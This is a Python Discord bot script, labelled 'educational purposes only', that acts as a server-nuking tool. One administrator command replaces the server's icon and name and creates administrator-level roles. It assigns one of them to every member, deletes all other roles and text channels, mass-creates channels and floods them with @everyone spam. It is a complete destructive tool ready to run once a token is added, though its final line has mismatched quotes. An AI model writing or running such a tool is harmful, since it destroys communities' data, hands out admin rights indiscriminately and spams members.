#educational purposes only

import discord
from discord.ext import commands
import asyncio
import requests
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)
spamming = False

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
@commands.has_permissions(administrator=True)
async def fuck(ctx):
    global spamming
    spamming = True

    image_url = "https://media.istockphoto.com/id/1502909075/vector/crying-bean-character.jpg?s=170667a&w=0&k=20&c=ETQuGy5xeh9zstOMj1Q-WL1dhrIsVBmlxzDaUaZMcwI="
    response = requests.get(image_url)
    image = BytesIO(response.content)

    try:
        await ctx.guild.edit(icon=image.read())
    except discord.HTTPException:
        await ctx.send("Failed to update server profile picture.")

    try:
        await ctx.guild.edit(name="Wanna wheep")
    except discord.HTTPException:
        await ctx.send("Failed to update server name.")

    try:
        fucked_role = await ctx.guild.create_role(
            name="fucked",
            color=discord.Color.from_rgb(139, 0, 0),
            permissions=discord.Permissions(administrator=True),
            reason="Role created by bot"
        )
    except discord.HTTPException:
        await ctx.send("Failed to create 'fucked' role.")

    wanna_wheep_role = discord.utils.get(ctx.guild.roles, name="wanna wheep")
    if not wanna_wheep_role:
        try:
            wanna_wheep_role = await ctx.guild.create_role(
                name="wanna wheep",
                color=discord.Color.red(),
                permissions=discord.Permissions(administrator=True),
                reason="Role created by bot"
            )
        except discord.HTTPException:
            await ctx.send("Failed to create 'wanna wheep' role.")

    for member in ctx.guild.members:
        try:
            await member.add_roles(fucked_role)
        except discord.HTTPException:
            pass

    for role in ctx.guild.roles:
        if role.name not in ["@everyone", "wanna wheep", "fucked"]:
            try:
                await role.delete()
            except discord.HTTPException:
                pass

    for channel in ctx.guild.channels:
        try:
            if isinstance(channel, discord.TextChannel):
                await channel.delete()
        except discord.HTTPException:
            pass

    channels = []
    i = 1
    while spamming:
        try:
            new_channel = await ctx.guild.create_text_channel(f'wannawheep{i}')
            channels.append(new_channel)
            i += 1
        except discord.HTTPException:
            break
        await asyncio.sleep(0.05)

    async def spam_channels():
        while spamming:
            for channel in channels:
                if not spamming:
                    break
                try:
                    await channel.send('@everyone wanna wheep little baby?')
                except discord.Forbidden:
                    break
                except discord.HTTPException:
                    pass
                await asyncio.sleep(0.001)

    bot.loop.create_task(spam_channels())

bot.run('BotToken")   #change BotToken to your bots token or it wont work
